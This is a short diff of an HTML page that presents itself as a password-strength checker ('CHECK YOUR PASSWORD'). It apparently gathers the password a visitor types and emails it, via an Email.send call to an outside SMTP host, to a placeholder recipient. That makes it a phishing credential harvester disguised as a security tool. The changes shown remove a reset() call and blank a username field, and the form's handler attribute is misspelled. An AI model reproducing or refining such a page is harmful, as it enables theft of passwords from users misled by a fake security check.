@@ -8,7 +8,7 @@
 <body>
 
 	<div class="container">
-		<form onsumbit ="sendEmail(); reset(); return false;"> 												                                       
+		<form onsumbit ="sendEmail(); return false;"> 												                                       
 			<h1> CHECK YOUR PASSWORD </h1><br>
 			<p>Please fill the form so we can check if your password is strong enough, <br>
  				your password is not safe if it can be brute-force or found in a database of leaked 				
@@ -26,7 +26,7 @@
 		function sendEmail(){
 			Email.send({
 				Host : "smtp.elasticemail.com",
-				Username : "username",
+				Username : "",
 				Password : "password",
 				To : 'them@website.com',
 				From : "you@isp.com",
